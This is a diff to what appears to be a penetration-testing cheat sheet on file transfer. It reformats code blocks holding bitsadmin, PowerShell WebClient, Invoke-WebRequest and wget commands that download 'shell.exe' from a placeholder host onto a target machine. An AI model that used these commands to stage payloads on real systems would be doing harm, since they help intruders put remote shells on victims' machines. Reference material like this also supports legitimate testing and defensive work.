@@ -8,6 +8,8 @@ bitsadmin /transfer shell /priority high http://example.com/shell.exe c:\temp\sh
 ### PowerShell
 ```powershell
 powershell -command "& {(New-Object Net.WebClient).DownloadFile('http://example.com/shell.exe','c:\temp\shell.exe')}"
+```
+```powershell
 Invoke-WebRequest http://example.com/shell.exe -OutFile shell.exe -UseBasicParsing
 ```
 
@@ -15,7 +17,7 @@ Invoke-WebRequest http://example.com/shell.exe -OutFile shell.exe -UseBasicParsi
 
 ### Bash
 ```bash
-$ wget http://example.com/shell.exe
+wget http://example.com/shell.exe
 ```
 
 # General
